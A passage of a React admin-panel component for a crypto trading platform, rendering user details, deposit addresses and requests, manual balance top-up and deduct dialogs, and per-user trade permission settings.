                            disabled={isResetting || isSaving || isDeleting}
                            className="rounded-full bg-blue-600 px-3 py-2 text-xs font-semibold text-white whitespace-nowrap disabled:opacity-60 hover:bg-blue-500"
                          >
                            {isResetting ? "Resetting..." : "Reset Password"}
                          </button>
                          <button
                            type="button"
                            onClick={() => void toggleUserRestriction(u)}
                            disabled={isSaving || isResetting || isDeleting}
                            className={
                              "rounded-full px-3 py-2 text-xs font-semibold text-white whitespace-nowrap disabled:opacity-60 " +
                              (restricted
                                ? "bg-emerald-600 hover:bg-emerald-500"
                                : "bg-rose-600 hover:bg-rose-500")
                            }
                          >
                            {isDeleting ? "Deleting..." : isSaving ? "Saving..." : restricted ? "Unrestrict" : "Restrict"}
                          </button>
                        </div>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        )}

        {detailOpen && (
          <div className="fixed inset-0 z-50 grid place-items-center bg-black/60 p-4">
            <div className="w-full max-w-3xl rounded-2xl border border-white/10 bg-[#0b0b0b] p-5">
              <div className="flex items-start justify-between gap-3">
                <div>
                  <div className="text-lg font-semibold">User Details</div>
                  <div className="mt-1 text-xs text-white/60">
                    Profile information and latest account activities.
                  </div>
                </div>
                <button
                  type="button"
                  onClick={closeDetail}
                  disabled={deleteUserSavingId === detailUser?.id}
                  className="rounded-lg border border-white/15 bg-white/5 px-3 py-1.5 text-xs hover:bg-white/10 disabled:opacity-60"
                >
                  Close
                </button>
              </div>

              {detailErr ? <div className="mt-3 text-sm text-red-300">{detailErr}</div> : null}

              <div className="mt-4 grid gap-4 md:grid-cols-2">
                <div className="rounded-xl border border-white/10 bg-black/25 p-3 text-sm">
                  <div className="text-xs uppercase tracking-wide text-white/45">Profile</div>
                  <div className="mt-2 flex justify-between gap-3">
                    <span className="text-white/60">Username</span>
                    <span className="text-white">{detailUser?.username || "-"}</span>
                  </div>
                  <div className="mt-1 flex justify-between gap-3">
                    <span className="text-white/60">Email</span>
                    <span className="text-white break-all">{detailUser?.email || "-"}</span>
                  </div>
                  <div className="mt-1 flex justify-between gap-3">
                    <span className="text-white/60">Phone</span>
                    <span className="text-white">{detailUser?.phone || "-"}</span>
                  </div>
                  <div className="mt-1 flex justify-between gap-3">
                    <span className="text-white/60">Created</span>
                    <span className="text-white">{fmtDateTime(detailUser?.createdAt)}</span>
                  </div>
                  <div className="mt-1 flex justify-between gap-3">
                    <span className="text-white/60">Managed By</span>
                    <span className="text-white">
                      {detailUser?.managedByUsername
                        ? `${detailUser.managedByUsername} (${String(detailUser.managedBy || "").slice(0, 8)}...)`
                        : detailUser?.managedBy
                          ? `${String(detailUser.managedBy).slice(0, 10)}...`
                          : "-"}
                    </span>
                  </div>
                </div>

                <div className="rounded-xl border border-white/10 bg-black/25 p-3 text-sm">
                  <div className="text-xs uppercase tracking-wide text-white/45">Balance & Access</div>
                  <div className="mt-2 grid grid-cols-2 gap-2 text-xs">
                    <div className="rounded-lg border border-white/10 px-2 py-1.5">
                      <div className="text-white/50">USDT</div>
                      <div className="mt-1 text-white">{fmtAsset(detailUser?.balances?.usdt, "USDT")}</div>
                    </div>
                    <div className="rounded-lg border border-white/10 px-2 py-1.5">
                      <div className="text-white/50">BTC</div>
                      <div className="mt-1 text-white">{fmtAsset(detailUser?.balances?.btc, "BTC")}</div>
                    </div>
                    <div className="rounded-lg border border-white/10 px-2 py-1.5">
                      <div className="text-white/50">ETH</div>
                      <div className="mt-1 text-white">{fmtAsset(detailUser?.balances?.eth, "ETH")}</div>
                    </div>
                    <div className="rounded-lg border border-white/10 px-2 py-1.5">
                      <div className="text-white/50">SOL</div>
                      <div className="mt-1 text-white">{fmtAsset(detailUser?.balances?.sol, "SOL")}</div>
                    </div>
                    <div className="rounded-lg border border-white/10 px-2 py-1.5">
                      <div className="text-white/50">XRP</div>
                      <div className="mt-1 text-white">{fmtAsset(detailUser?.balances?.xrp, "XRP")}</div>
                    </div>
                    <div className="rounded-lg border border-white/10 px-2 py-1.5">
                      <div className="text-white/50">Access</div>
                      <div className="mt-1 text-white">
                        {detailUser?.access?.restricted ? "Restricted" : "Active"}
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              <div className="mt-4 rounded-xl border border-rose-400/25 bg-rose-500/10 p-3">
                <div className="flex flex-wrap items-center justify-between gap-3">
                  <div>
                    <div className="text-sm font-semibold text-rose-200">Danger Zone</div>
                    <div className="mt-1 text-xs text-rose-100/80">
                      Permanently delete this customer account and related records.
                    </div>
                  </div>
                  <button
                    type="button"
                    onClick={() => void deleteCustomerAccount()}
                    disabled={detailLoading || !detailUser?.id || deleteUserSavingId === detailUser?.id}
                    className="rounded-lg bg-rose-600 px-3 py-2 text-xs font-semibold text-white disabled:opacity-60 hover:bg-rose-500"
                  >
                    {deleteUserSavingId === detailUser?.id ? "Deleting..." : "Delete Customer"}
                  </button>
                </div>
                {deleteUserErr ? <div className="mt-2 text-xs text-rose-200">{deleteUserErr}</div> : null}
              </div>

              <div className="mt-4 rounded-xl border border-white/10 bg-black/25 p-3">
                <div className="flex items-center justify-between gap-3">
                  <div className="text-sm font-semibold">Recent Activities</div>
                  {detailLoading ? <div className="text-xs text-white/55">Loading...</div> : null}
                </div>

                <div className="mt-3 flex flex-wrap gap-2">
                  {DETAIL_ACTIVITY_FILTER_OPTIONS.map((opt) => {
                    const active = detailActivityFilter === opt.value;
                    return (
                      <button
                        key={opt.value}
                        type="button"
                        onClick={() => setDetailActivityFilter(opt.value)}
                        className={
                          "rounded-full border px-2.5 py-1 text-[11px] font-semibold " +
                          (active
                            ? "border-blue-400/40 bg-blue-500/20 text-blue-200"
                            : "border-white/15 bg-white/5 text-white/70 hover:bg-white/10")
                        }
                      >
                        {opt.label}
                      </button>
                    );
                  })}
                </div>

                {filteredDetailActivities.length === 0 && !detailLoading ? (
                  <div className="mt-3 rounded-lg border border-white/10 bg-black/30 px-3 py-2 text-xs text-white/55">
                    No activity for this filter.
                  </div>
                ) : null}

                {filteredDetailActivities.length > 0 ? (
                  <div className="mt-3 max-h-72 overflow-auto pr-1">
                    <div className="space-y-2">
                      {filteredDetailActivities.map((item) => (
                        <div
                          key={item.id}
                          className="rounded-lg border border-white/10 bg-black/30 px-3 py-2 text-xs"
                        >
                          <div className="flex flex-wrap items-center justify-between gap-2">
                            <div className="font-semibold text-white">{item.title}</div>
                            <div className="inline-flex items-center gap-2">
                              <span
                                className={
                                  "rounded-full border px-2 py-0.5 text-[10px] font-semibold " +
                                  activityStatusClass(item.status)
                                }
                              >
                                {item.status}
                              </span>
                              <span className="text-white/55">{fmtDateTime(item.createdAt)}</span>
                            </div>
                          </div>
                          <div className="mt-1 text-white/70 break-all">{item.detail}</div>
                        </div>
                      ))}
                    </div>
                  </div>
                ) : null}
              </div>
            </div>
          </div>
        )}
      </div>
    );
  }

  if (tab === "topups") {
    return (
      <div className="rounded-3xl border border-white/10 bg-white/5 p-6">
        <div className="mb-4 flex items-center justify-between gap-3">
          <div>
            <div className="flex items-center gap-2">
              <div className="text-xl font-semibold">Deposit Permission</div>
              <span className="inline-flex min-w-6 items-center justify-center rounded-full bg-rose-500 px-2 py-0.5 text-xs font-semibold text-white">
                {pendingDepositCount}
              </span>
            </div>
            <div className="mt-1 text-sm text-white/60">
              Manage balances in More, and approve/decline deposit requests below.
            </div>
          </div>
          <button
            type="button"
            onClick={() => void reloadDepositRequests()}
            className="rounded-xl border border-white/10 bg-white/5 px-4 py-2 text-sm hover:bg-white/10"
          >
            {depositRequestsLoading ? "Refreshing..." : "Refresh Requests"}
          </button>
        </div>
        <div className="mb-6 rounded-2xl border border-white/10 bg-black/20 p-4">
          <div className="text-base font-semibold">Deposit Wallet Addresses (ON-CHAIN)</div>
          <div className="mt-1 text-sm text-white/60">
            These superadmin addresses are shown to all users on Deposit page.
          </div>

          <div className="mt-3 grid gap-3 sm:grid-cols-2">
            {ASSETS.map((a) => (
              <label key={a} className="block">
                <div className="mb-1 text-xs text-white/60">{a === "SOL" ? "Solana (SOL)" : a}</div>
                <input
                  value={depositAddresses[a] || ""}
                  readOnly={!canEditDepositAddresses}
                  disabled={!canEditDepositAddresses}
                  onChange={(e) =>
                    setDepositAddresses((prev) => ({
                      ...prev,
                      [a]: e.target.value,
                    }))
                  }
                  placeholder={`${a} wallet address`}
                  className="w-full rounded-xl border border-white/10 bg-black/30 px-4 py-3 text-sm outline-none disabled:cursor-not-allowed disabled:opacity-70"
                />
              </label>
            ))}
          </div>

          {!canEditDepositAddresses ? (
            <div className="mt-3 text-xs text-amber-200">Read only: only primary superadmin can edit addresses.</div>
          ) : null}
          {depositAddressErr ? <div className="mt-3 text-sm text-red-300">{depositAddressErr}</div> : null}
          {depositAddressInfo ? <div className="mt-3 text-sm text-emerald-300">{depositAddressInfo}</div> : null}

          <div className="mt-3 flex flex-wrap gap-2">
            <button
              type="button"
              disabled={depositAddressSaving || !canEditDepositAddresses}
              onClick={() => void saveDepositAddresses()}
              className="rounded-xl bg-blue-600 px-4 py-2 text-sm font-semibold text-white disabled:opacity-60"
            >
              {depositAddressSaving ? "Saving..." : "Save Addresses"}
            </button>
            <button
              type="button"
              onClick={() => void reloadDepositAddresses()}
              className="rounded-xl border border-white/10 bg-white/5 px-4 py-2 text-sm hover:bg-white/10"
            >
              {depositAddressLoading ? "Refreshing..." : "Refresh"}
            </button>
          </div>
        </div>

        <div className="mb-6 rounded-2xl border border-white/10 bg-black/20 p-4">
          <div className="flex flex-wrap items-center justify-between gap-3">
            <div>
              <div className="text-base font-semibold">Deposit Request Queue</div>
              <div className="mt-1 text-xs text-white/60">
                Approve or decline pending deposit requests.
              </div>
            </div>

            <div className="flex items-center gap-2">
              <label className="text-xs text-white/60" htmlFor="topups-deposit-request-user-filter">
                User
              </label>
              <select
                id="topups-deposit-request-user-filter"
                value={depositRequestUserFilter}
                onChange={(e) => setDepositRequestUserFilter(e.target.value)}
                className="rounded-xl border border-white/10 bg-black/30 px-3 py-2 text-xs text-white outline-none"
              >
                <option value="ALL" className="bg-black">
                  All pending
                </option>
                {requestUserOptions.map((opt) => (
                  <option key={opt.id} value={opt.id} className="bg-black">
                    {opt.label}
                  </option>
                ))}
              </select>
            </div>
          </div>

          {filteredDepositRequests.length === 0 ? (
            <div className="mt-3 rounded-xl border border-white/10 bg-black/30 px-3 py-2 text-sm text-white/60">
              No pending deposit requests for this filter.
            </div>
          ) : (
            <div className="mt-3 overflow-x-auto">
              <table className="w-full min-w-[900px]">
                <thead>
                  <tr className="text-left text-xs uppercase tracking-wide text-white/55">
                    <th className="py-2">User</th>
                    <th className="py-2">Email</th>
                    <th className="py-2">Asset</th>
                    <th className="py-2 text-right">Amount</th>
                    <th className="py-2">Wallet</th>
                    <th className="py-2">Requested</th>
                    <th className="py-2 pr-1 text-right">Action</th>
                  </tr>
                </thead>
                <tbody>
                  {filteredDepositRequests.map((req) => {
                    const user = usersForTable.find((u) => u.id === req.userId);
                    const username = req.username || user?.username || "-";
                    const email = req.email || user?.email || "-";

                    return (
                      <tr key={req.id} className="border-t border-white/10 text-sm">
                        <td className="py-2">{username}</td>
                        <td className="py-2">{email}</td>
                        <td className="py-2">{req.asset}</td>
                        <td className="py-2 text-right">{fmtAsset(req.amount, req.asset)}</td>
                        <td className="max-w-[220px] py-2 text-xs text-white/70 break-all">{req.walletAddress}</td>
                        <td className="py-2 text-xs text-white/70">{fmtDateTime(req.createdAt)}</td>
                        <td className="py-2 pr-1 text-right">
                          <div className="inline-flex max-w-[220px] flex-wrap justify-end gap-2">
                            <button
                              type="button"
                              disabled={depositRequestActionId === req.id}
                              onClick={() => void processDepositRequest(req.id, "APPROVE")}
                              className="rounded-lg bg-emerald-600 px-3 py-1.5 text-xs font-semibold text-white whitespace-nowrap disabled:opacity-60"
                            >
                              {depositRequestActionId === req.id ? "Processing..." : "Approve"}
                            </button>
                            <button
                              type="button"
                              disabled={depositRequestActionId === req.id}
                              onClick={() => void processDepositRequest(req.id, "DECLINE")}
                              className="rounded-lg bg-rose-600 px-3 py-1.5 text-xs font-semibold text-white whitespace-nowrap disabled:opacity-60"
                            >
                              {depositRequestActionId === req.id ? "Processing..." : "Decline"}
                            </button>
                          </div>
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          )}
        </div>

        {loadingUsers ? <div className="text-white/60">Loading...</div> : null}
        {usersErr ? <div className="text-red-400">{usersErr}</div> : null}
        {topupInfo ? <div className="mb-3 text-emerald-300">{topupInfo}</div> : null}
        {depositRequestsErr ? <div className="mb-3 text-red-300">{depositRequestsErr}</div> : null}
        {depositRequestsInfo ? <div className="mb-3 text-emerald-300">{depositRequestsInfo}</div> : null}

        {!loadingUsers && !usersErr && (
          <>
            <div className="overflow-x-auto">
              <table className="w-full min-w-[980px]">
                <thead>
                  <tr className="text-left text-white/60">
                    <th className="py-3">USER</th>
                    <th className="py-3">EMAIL</th>
                    <th className="py-3 text-right">USDT</th>
                    <th className="py-3 text-right">BTC</th>
                    <th className="py-3 text-right">ETH</th>
                    <th className="py-3 text-right">SOL</th>
                    <th className="py-3 text-right">XRP</th>
                    <th className="py-3 pr-1 text-right">ACTION</th>
                  </tr>
                </thead>
                <tbody>
                  {usersForTable.map((u) => {
                    const pendingCount = pendingByUserId.get(u.id) ?? 0;
                    return (
                      <tr key={u.id} className="border-t border-white/10">
                        <td className="py-3">{u.username ?? "-"}</td>
                        <td className="py-3">{u.email ?? "-"}</td>
                        <td className="py-3 text-right">{fmtAsset(u.usdt ?? u.balance, "USDT")}</td>
                        <td className="py-3 text-right">{fmtAsset(u.btc, "BTC")}</td>
                        <td className="py-3 text-right">{fmtAsset(u.eth, "ETH")}</td>
                        <td className="py-3 text-right">{fmtAsset(u.sol, "SOL")}</td>
                        <td className="py-3 text-right">{fmtAsset(u.xrp, "XRP")}</td>
                        <td className="py-3 pr-1 text-right">
                          <div className="inline-flex max-w-[220px] flex-wrap items-center justify-end gap-2">
                            {pendingCount > 0 ? (
                              <button
                                type="button"
                                onClick={() => setDepositRequestUserFilter(u.id)}
                                className="rounded-full border border-rose-400/40 bg-rose-500/15 px-3 py-1.5 text-xs font-semibold text-rose-200 whitespace-nowrap"
                              >
                                Requests {pendingCount}
                              </button>
                            ) : null}
                            <button
                              type="button"
                              onClick={() => openTopup(u)}
                              className="rounded-full bg-yellow-500 px-3 py-1.5 text-sm font-semibold text-black whitespace-nowrap"
                            >
                              More
                            </button>
                          </div>
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>

            {topupOpen && selectedUser && (
              <div className="fixed inset-0 z-50 grid place-items-center bg-black/60 p-4">
                <div className="w-full max-w-md rounded-2xl border border-white/10 bg-[#0b0b0b] p-5">
                  <div className="text-lg font-semibold">User Information</div>
                  <div className="mt-1 text-sm text-white/60">
                    Review user info and adjust balances.
                  </div>

                  <div className="mt-3 rounded-xl border border-white/10 bg-black/25 p-3 text-sm">
                    <div className="flex justify-between gap-3">
                      <span className="text-white/60">Username</span>
                      <span className="text-white">{selectedUser.username ?? "-"}</span>
                    </div>
                    <div className="mt-1 flex justify-between gap-3">
                      <span className="text-white/60">Email</span>
                      <span className="text-white">{selectedUser.email ?? "-"}</span>
                    </div>
                    <div className="mt-1 flex justify-between gap-3">
                      <span className="text-white/60">USDT</span>
                      <span className="text-white">{fmtAsset(selectedUser.usdt ?? selectedUser.balance, "USDT")}</span>
                    </div>
                    <div className="mt-1 grid grid-cols-2 gap-2 text-xs">
                      <div className="flex items-center justify-between rounded-lg border border-white/10 px-2 py-1">
                        <span className="text-white/50">BTC</span>
                        <span>{fmtAsset(selectedUser.btc, "BTC")}</span>
                      </div>
                      <div className="flex items-center justify-between rounded-lg border border-white/10 px-2 py-1">
                        <span className="text-white/50">ETH</span>
                        <span>{fmtAsset(selectedUser.eth, "ETH")}</span>
                      </div>
                      <div className="flex items-center justify-between rounded-lg border border-white/10 px-2 py-1">
                        <span className="text-white/50">SOL</span>
                        <span>{fmtAsset(selectedUser.sol, "SOL")}</span>
                      </div>
                      <div className="flex items-center justify-between rounded-lg border border-white/10 px-2 py-1">
                        <span className="text-white/50">XRP</span>
                        <span>{fmtAsset(selectedUser.xrp, "XRP")}</span>
                      </div>
                    </div>
                  </div>

                  <div className="mt-4">
                    <div className="mb-2 text-sm font-semibold">
                      {topupMode === "SUBTRACT" ? "Deduct Balance" : "Top up Balance"}
                    </div>
                    <div className="mb-2 text-xs text-white/60">Action</div>
                    <div className="grid grid-cols-2 gap-2">
                      <button
                        type="button"
                        onClick={() => setTopupMode("ADD")}
                        className={
                          "rounded-xl px-4 py-2 text-sm font-semibold border " +
                          (topupMode === "ADD"
                            ? "border-emerald-400/50 bg-emerald-500/20 text-emerald-200"
                            : "border-white/10 bg-black/30 text-white/70")
                        }
                      >
                        Top up
                      </button>
                      <button
                        type="button"
                        onClick={() => setTopupMode("SUBTRACT")}
                        className={
                          "rounded-xl px-4 py-2 text-sm font-semibold border " +
                          (topupMode === "SUBTRACT"
                            ? "border-rose-400/50 bg-rose-500/20 text-rose-200"
                            : "border-white/10 bg-black/30 text-white/70")
                        }
                      >
                        Deduct
                      </button>
                    </div>
                  </div>

                  <div className="mt-4">
                    <div className="mb-2 text-xs text-white/60">Asset</div>
                    <select
                      value={asset}
                      onChange={(e) => setAsset(e.target.value as Asset)}
                      className="w-full rounded-xl border border-white/10 bg-black/30 px-4 py-3 outline-none"
                    >
                      {ASSETS.map((a) => (
                        <option key={a} value={a} className="bg-black">
                          {a}
                        </option>
                      ))}
                    </select>
                  </div>

                  <input
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    placeholder={topupMode === "SUBTRACT" ? "Amount to deduct" : "Amount to top up"}
                    className="mt-3 w-full rounded-xl border border-white/10 bg-black/30 px-4 py-3 outline-none"
                  />

                  <input
                    value={note}
                    onChange={(e) => setNote(e.target.value)}
                    placeholder="Note (optional)"
                    className="mt-3 w-full rounded-xl border border-white/10 bg-black/30 px-4 py-3 outline-none"
                  />

                  {topupErr ? <div className="mt-3 text-sm text-red-300">{topupErr}</div> : null}

                  <div className="mt-4 flex justify-end gap-2">
                    <button
                      onClick={closeTopup}
                      className="rounded-xl border border-white/10 bg-white/5 px-4 py-2"
                    >
                      Cancel
                    </button>
                    <button
                      disabled={topupLoading}
                      onClick={confirmTopup}
                      className={
                        "rounded-xl px-4 py-2 font-semibold disabled:opacity-60 " +
                        (topupMode === "SUBTRACT" ? "bg-rose-600" : "bg-blue-600")
                      }
                    >
                      {topupLoading
                        ? "Processing..."
                        : topupMode === "SUBTRACT"
                          ? "Confirm Deduct"
                          : "Confirm Top up"}
                    </button>
                  </div>
                </div>
              </div>
            )}
          </>
        )}
      </div>
    );
  }

  if (tab === "mining") {
    return <MiningPendingTable />;
  }

  if (tab === "orders") {
    return (
      <div className="rounded-3xl border border-white/10 bg-white/5 p-6">
        <div className="mb-4 text-xl font-semibold">Trade Permissions</div>
        <div className="mb-4 text-sm text-white/60">
          Select a trade permission mode per user.
        </div>

        {permissionLoading ? <div className="text-white/60">Loading...</div> : null}
        {permissionErr ? <div className="mb-3 text-red-400">{permissionErr}</div> : null}

        {!permissionLoading && (
          <div className="overflow-x-auto">
            <table className="w-full min-w-[760px]">
              <thead>
                <tr className="text-left text-white/60">
                  <th className="py-3">USER</th>
                  <th className="py-3">EMAIL</th>
                  <th className="py-3">SESSION</th>
                  <th className="py-3">PERMISSION</th>
                  <th className="py-3 text-right">ACTION</th>
                </tr>
              </thead>
              <tbody>
                {permissionUsers.map((u) => (
                  <tr key={u.id} className="border-t border-white/10">
                    <td className="py-3">{u.username ?? "-"}</td>
                    <td className="py-3">
                      <div>{u.email ?? "-"}</div>
                      <div className="mt-1 text-xs text-white/45">
                        {permissionModeLabel(normalizePermissionMode(u.permissionMode))}
                      </div>
                    </td>
                    <td className="py-3">
                      <span className="rounded-lg border border-white/10 bg-black/30 px-2 py-1 text-xs text-white/80">
                        {permissionSessionLabel(normalizePermissionMode(u.permissionMode))}
                      </span>
                    </td>
                    <td className="py-3">
                      <select
                        value={normalizePermissionMode(u.permissionMode)}
                        onChange={(e) => {
                          const mode = normalizePermissionMode(e.target.value);
                          setPermissionUsers((prev) =>
                            prev.map((x) => (x.id === u.id ? { ...x, permissionMode: mode } : x))
                          );
                        }}
                        className="w-full rounded-xl border border-white/10 bg-black/30 px-3 py-2 text-sm text-white outline-none focus:ring-2 focus:ring-blue-500/30"
                      >
                        {PERMISSION_MODE_OPTIONS.map((opt) => (
                          <option key={opt.value} value={opt.value}>
                            {opt.label}
                          </option>
                        ))}
                      </select>
                    </td>
                    <td className="py-3 text-right">
                      <button
                        type="button"
                        disabled={permissionSavingUserId === u.id}
                        onClick={() =>
                          void savePermission(u.id, normalizePermissionMode(u.permissionMode))
                        }
                        className="rounded-xl bg-blue-600 px-4 py-2 text-sm font-semibold text-white disabled:opacity-60"
                      >
                        {permissionSavingUserId === u.id ? "Saving..." : "Save"}
                      </button>
                    </td>
                  </tr>
                ))}
                {permissionUsers.length === 0 ? (
                  <tr>
                    <td className="py-6 text-white/60" colSpan={5}>
                      No users found.
                    </td>
                  </tr>
                ) : null}
              </tbody>
            </table>
          </div>
        )}

        <button
          type="button"
          onClick={() => void reloadPermissionUsers()}
          className="mt-4 rounded-xl border border-white/10 bg-white/5 px-4 py-2 text-sm hover:bg-white/10"
        >
          Refresh Permissions
        </button>
      </div>
    );
  }

  if (tab === "withdraw") {
    return <WithdrawRequestsPanel />;
  }

  if (tab === "notify") {
    return <NotifyPanel />;
  }

  if (tab === "support") {
    return <SupportChatPanel />;
  }

  return (
    <div className="rounded-3xl border border-white/10 bg-white/5 p-6">
      <div className="text-white/60">Unknown tab.</div>
    </div>
  );
}
